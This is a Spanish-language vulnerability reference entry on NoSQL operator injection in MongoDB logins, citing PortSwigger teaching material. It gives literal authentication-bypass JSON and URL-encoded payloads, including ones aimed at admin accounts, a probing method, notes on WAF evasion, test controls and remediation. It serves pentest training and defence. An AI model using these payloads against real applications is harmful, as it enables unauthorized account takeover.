---
clase: inyeccion
tech: mongodb
cwe: CWE-943
cvss: 9.8 # [derivado] bypass de autenticacion sin credenciales
payload: |
  # Peticion NORMAL de login - LITERAL de la fuente:
  {"username":"wiener","password":"peter"}
  #
  # INYECCION DE OPERADOR - LITERALES de la fuente, en orden de agresividad:
  #
  # 1) Usuario conocido, cualquier password:
  {"username":{"$ne":"invalid"},"password":"peter"}
  #
  # 2) Sin conocer NI usuario NI password (bypass completo):
  {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
  #
  # 3) Dirigido a cuentas administrativas concretas:
  {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
  #
  # FORMA URL-ENCODED, para endpoints que no aceptan JSON - LITERAL de la fuente.
  # La pagina da esta forma como equivalente de 'username=wiener':
  username[$ne]=invalid
  #
  # Mecanica: el codigo espera una CADENA y recibe un OBJETO. MongoDB interpreta
  # {"$ne":"invalid"} como la condicion 'distinto de invalid', que es cierta para
  # casi todo. La comparacion de igualdad se convierte en una comparacion de
  # desigualdad elegida por el atacante.
  #
  # NOTA: '$gt' NO aparece en la pagina fuente. No lo incluyo como literal.
precondicion: "La aplicacion inserta valores de entrada en una consulta de MongoDB SIN validar su TIPO. No hace falta inyectar sintaxis ni escapar comillas: basta que el valor llegue como objeto donde se esperaba cadena. Por eso los filtros de inyeccion orientados a caracteres no lo detectan."
como_se_descubre: |
  Señal en recon: endpoint que acepta JSON y una pila que sugiera MongoDB (Node/Express,
  Mongoose, Meteor, cabeceras o errores que nombren Mongo).
  Sonda de coste minimo: sustituir UN valor de cadena por {"$ne":"invalid"} y comparar
  la respuesta. Si cambia, hay inyeccion de operador.
  Lo que hace a esta clase especialmente rentable: el payload NO CONTIENE NINGUN
  METACARACTER. No hay comillas, ni punto y coma, ni comentarios. Un WAF entrenado para
  inyeccion SQL no ve absolutamente nada sospechoso, porque es JSON perfectamente valido.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}} -> sesion valida
  # B: {"username":"invalid","password":"invalid"}                 -> login fallido
  # C: {"username":{"$ne":"invalid"},"password":"passwordIncorrecta"}
  #    -> si TAMBIEN autentica, confirma que el operador actua sobre el campo password
  # El trio distingue 'el operador funciona' de 'estas credenciales existian'. Sin B,
  # un login exitoso no prueba nada; sin C, no se sabe cual de los dos campos es
  # vulnerable, dato que el equipo necesita para corregir.
mata: |
  - La aplicacion valida el TIPO de la entrada (exige cadena) -> muere. Es la correccion.
  - Allowlist de claves aceptadas, que rechaza cualquier clave que empiece por '$'.
  - Consultas parametrizadas en lugar de concatenacion/insercion directa del objeto.
  - La capa de BD aplana los objetos a cadena antes de consultar.
  - ADVERTENCIA: la fuente usa insecure-website.com y no nombra objetivo real. Lo
    reproducible es la tecnica sobre MongoDB como tecnologia nombrada.
fuente: "https://portswigger.net/web-security/nosql-injection (seccion de inyeccion de operadores). Todos los payloads literales de la pagina. '$gt' no aparece en la pagina."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Inyección de operadores NoSQL — bypass de autenticación sin un solo metacarácter

## Principio
El código espera una cadena y recibe un objeto. MongoDB interpreta `{"$ne":"invalid"}`
como la condición "distinto de invalid", que es cierta para prácticamente cualquier
registro. La comparación de igualdad que el desarrollador escribió se convierte en una
comparación de desigualdad que elige el atacante.

Lo decisivo para la práctica: **el payload no contiene ningún metacarácter**. No hay
comillas, ni punto y coma, ni comentarios, ni paréntesis. Es JSON perfectamente válido.
Un WAF entrenado para inyección SQL no ve nada sospechoso, porque desde su punto de vista
no hay nada sospechoso — el ataque vive en el **tipo** del valor, no en su contenido.

## Payload
Login normal:

```json
{"username":"wiener","password":"peter"}
```

Usuario conocido, cualquier contraseña:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Sin conocer ni usuario ni contraseña — bypass completo:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Dirigido a cuentas administrativas:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Y la forma para endpoints que no aceptan JSON, que la fuente da como equivalente de
`username=wiener`:

```
username[$ne]=invalid
```

Nota: `$gt` circula mucho en material de terceros pero **no aparece en esta fuente**, así
que no lo incluyo.

## Por qué hace falta el tercer control
El par A/B prueba que el operador funciona. El tercer control —operador en `username`
pero contraseña literal incorrecta— identifica **cuál de los dos campos** es vulnerable.
Es el dato que el equipo necesita para corregir, y sin él el informe dice "el login es
inyectable" sin decir dónde.

## Impacto
Autenticación completa como un usuario arbitrario sin credenciales, y con la variante
`$in` dirigible a cuentas administrativas concretas. Es el techo de impacto en una
aplicación web, con un payload de una línea y sin fuerza bruta.

## Advertencia de procedencia
La fuente es material docente: dominio genérico, sin objetivo real nombrado. Lo
reproducible aquí es la técnica sobre **MongoDB como tecnología nombrada**, con payloads
literales y operadores específicos del producto.

## Remediación
De la fuente: *"To prevent operator injection, apply an allowlist of accepted keys."* Y
las reglas generales: sanear y validar la entrada con una allowlist de caracteres
aceptados, e insertar la entrada mediante consultas parametrizadas en lugar de
concatenarla.

`# [derivado]`: la corrección específica y mínima de esta clase es **validar el tipo**.
Si el campo debe ser una cadena, rechazar cualquier cosa que no lo sea antes de que llegue
al constructor de consultas. Validar caracteres no sirve de nada aquí, porque el payload
no tiene caracteres problemáticos.
